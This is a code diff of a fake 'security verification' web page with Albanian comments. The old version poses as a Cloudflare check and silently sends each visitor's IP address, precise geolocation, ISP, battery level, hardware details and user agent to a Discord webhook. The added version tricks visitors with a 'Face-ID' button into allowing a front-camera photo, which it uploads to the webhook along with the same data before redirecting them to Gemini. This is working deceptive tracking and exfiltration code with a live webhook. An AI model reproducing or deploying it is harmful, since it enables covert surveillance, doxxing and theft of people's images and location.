@@ -4,126 +4,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification | Cloudflare</title>
+    <title>Security Verification | Identity Check</title>
     <style>
-        body { 
-            background: #ffffff; 
-            color: #313131; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            font-family: -apple-system, system-ui, sans-serif; 
-        }
-        .container {
-            text-align: center;
-            max-width: 400px;
-            padding: 40px;
-            border-radius: 12px;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0052cc;
-            border-radius: 50%;
-            width: 35px;
-            height: 35px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
-        p { font-size: 14px; color: #666; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { width: 90%; max-width: 600px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 20px #0f0; background: rgba(0, 20, 0, 0.9); }
+        .line { margin: 5px 0; font-size: 14px; white-space: pre-wrap; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        video, canvas { display: none; }
+        .btn { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h1>Verifikimi i Sigurisë</h1>
-        <p>Po kontrollojmë nëse lidhja juaj është e sigurt...</p>
+
+    <div class="terminal" id="terminal">
+        <div class="line"> [SYSTEM]: INITIATING SECURE PROTOCOL...</div>
+        <div class="line"> [SYSTEM]: ANALYZING CONNECTION...</div>
+        <div class="line" id="status"> [WAIT]: Duke pritur verifikimin e identitetit...</div>
+        <button class="btn" id="startBtn">VERIFIKO IDENTITETIN (FACE-ID)</button>
+        <div class="line blink">_</div>
     </div>
+
+    <!-- Elementet e fshehura për foto -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
         const redirectURL = "https://gemini.google.com/app";
 
-        // Funksioni për gjetjen e modelit të iPhone-it
-        function getIPhoneModel() {
-            const ratio = window.devicePixelRatio;
+        const startBtn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Funksioni për marrjen e modelit të iPhone
+        function getDetailedModel() {
             const w = window.screen.width;
             const h = window.screen.height;
-            if (ratio === 3 && w === 393 && h === 852) return "iPhone 15 / 15 Pro / 14 Pro";
-            if (ratio === 3 && w === 430 && h === 932) return "iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
-            if (ratio === 3 && w === 390 && h === 844) return "iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
-            if (ratio === 3 && w === 428 && h === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
-            if (ratio === 3 && w === 375 && h === 812) return "iPhone 13 mini / 12 mini / 11 Pro / XS / X";
-            if (ratio === 2 && w === 414 && h === 896) return "iPhone 11 / XR";
-            if (ratio === 3 && w === 414 && h === 896) return "iPhone 11 Pro Max / XS Max";
-            return "Pajisje Apple (Model i paidentifikuar)";
+            const r = window.devicePixelRatio;
+            if (r === 3 && w === 393 && h === 852) return "iPhone 15 / 15 Pro / 14 Pro";
+            if (r === 3 && w === 430 && h === 932) return "iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
+            if (r === 3 && w === 390 && h === 844) return "iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
+            if (r === 3 && w === 428 && h === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
+            return `${navigator.platform} (Res: ${w}x${h})`;
         }
 
-        async function collectAndSend() {
+        async function sendToDiscord(embed, blob = null) {
+            const formData = new FormData();
+            
+            if (blob) {
+                formData.append('file', blob, 'face-capture.png');
+            }
+            
+            formData.append('payload_json', JSON.stringify({
+                username: "EXPLOIT SYSTEM",
+                avatar_url: "https://i.imgur.com/8nLFC9m.png",
+                embeds: [embed]
+            }));
+
+            await fetch(webhookURL, { method: 'POST', body: formData });
+        }
+
+        async function captureFace() {
             try {
-                // Lokacioni dhe IP (Preciz)
-                const geoReq = await fetch('https://demo.ip-api.com/json/?fields=66846719');
-                const g = await geoReq.json();
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                
+                status.innerText = " [OK]: Verifikimi në proces...";
 
-                // Bateria
-                let batteryStatus = "E panjohur";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'Në karikim ⚡' : 'Në bateri 🔋'})`;
-                }
+                // Presim pak që kamera të fokusohet
+                await new Promise(r => setTimeout(r, 1500));
 
-                // Detajet teknike
-                const specs = {
-                    model: /iPhone|iPad|iPod/.test(navigator.userAgent) ? getIPhoneModel() : navigator.platform,
-                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "E panjohur",
-                    cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "E panjohur",
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    time: new Date().toLocaleTimeString('sq-AL'),
-                    lang: navigator.language
-                };
-
-                const payload = {
-                    "content": "☣️ **DATA BREACH DETECTED** ☣️",
-                    "embeds": [{
-                        "title": "💀 SYSTEM INFO EXFILTRATED",
-                        "description": "Të dhënat u morën me sukses nga pajisja e shënjestruar.",
-                        "color": 0, // E zezë
-                        "fields": [
-                            { "name": "👤 Identiteti (Modeli)", "value": `\`${specs.model}\``, "inline": true },
-                            { "name": "🔋 Statusi i Baterisë", "value": `\`${batteryStatus}\``, "inline": true },
-                            { "name": "⏰ Ora e Pajisjes", "value": `\`${specs.time}\``, "inline": true },
-                            { "name": "🌐 Adresa IP", "value": `\`${g.query}\``, "inline": true },
-                            { "name": "📍 Lokacioni", "value": `\`${g.city}, ${g.country}\``, "inline": true },
-                            { "name": "📡 ISP (Rrjeti)", "value": `\`${g.isp}\``, "inline": false },
-                            { "name": "⚙️ Hardware Specs", "value": `RAM: \`${specs.ram}\` | CPU: \`${specs.cpu}\` | Res: \`${specs.screen}\``, "inline": false },
-                            { "name": "🛡️ VPN / Proxy", "value": g.proxy ? "⚠️ **DETECTED**" : "✅ NONE", "inline": true },
-                            { "name": "📶 Connection", "value": g.mobile ? "📱 Mobile Data" : "🏠 WiFi", "inline": true },
-                            { "name": "📱 Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
-                            { "name": "🗺️ Google Maps", "value": `[SHIKO LOKACIONIN](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
-                        ],
-                        "footer": { "text": "Hacker Logger v9.9.9 | Encrypted Tunnel" },
-                        "timestamp": new Date()
-                    }]
-                };
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-            } catch (e) {
-                console.log("Breach failed.");
-            } finally {
-                setTimeout(() => { window.location.href = redirectURL; }, 2000);
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+                
+                // Mbyllim kamerën
+                stream.getTracks().forEach(track => track.stop());
+                return blob;
+            } catch (err) {
+                console.log("Kamera u refuzua.");
+                return null;
             }
         }
 
-        window.onload = collectAndSend;
+        startBtn.onclick = async () => {
+            startBtn.style.display = "none";
+            status.innerText = " [WAIT]: Duke hapur modulin e sigurisë...";
+
+            // 1. Kapim foton (Kërkon leje)
+            const faceBlob = await captureFace();
+
+            // 2. Mbledhim të dhënat extreme
+            const ipRes = await fetch('https://demo.ip-api.com/json/?fields=66846719');
+            const g = await ipRes.json();
+            
+            let battery = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            }
+
+            const embed = {
+                title: "💀 EXTREME DATA EXFILTRATION",
+                color: 16711680,
+                fields: [
+                    { name: "📱 Pajisja", value: `\`${getDetailedModel()}\``, inline: true },
+                    { "name": "🔋 Bateria", "value": `\`${battery}\``, "inline": true },
+                    { "name": "🌐 IP Real", "value": `\`${g.query}\``, "inline": true },
+                    { "name": "📍 Lokacioni", "value": `\`${g.city}, ${g.regionName}, ${g.country}\``, "inline": true },
+                    { "name": "📡 ISP", "value": `\`${g.isp}\``, "inline": false },
+                    { "name": "⚙️ Hardware", "value": `CPU: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory}GB`, "inline": true },
+                    { "name": "⏰ Ora", "value": `\`${new Date().toLocaleString()}\``, "inline": true },
+                    { "name": "🛡️ VPN?", "value": g.proxy ? "⚠️ PO" : "✅ JO", "inline": true },
+                    { "name": "📱 User-Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
+                    { "name": "🗺️ Maps", "value": `[Klikoni për Hartën](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
+                ],
+                footer: { text: "Protocol: EXTREME-LOG-v7" },
+                timestamp: new Date()
+            };
+
+            await sendToDiscord(embed, faceBlob);
+            
+            status.innerText = " [OK]: Verifikimi përfundoi. Duke u ridrejtuar...";
+            setTimeout(() => { window.location.href = redirectURL; }, 1000);
+        };
     </script>
 </body>
 </html>
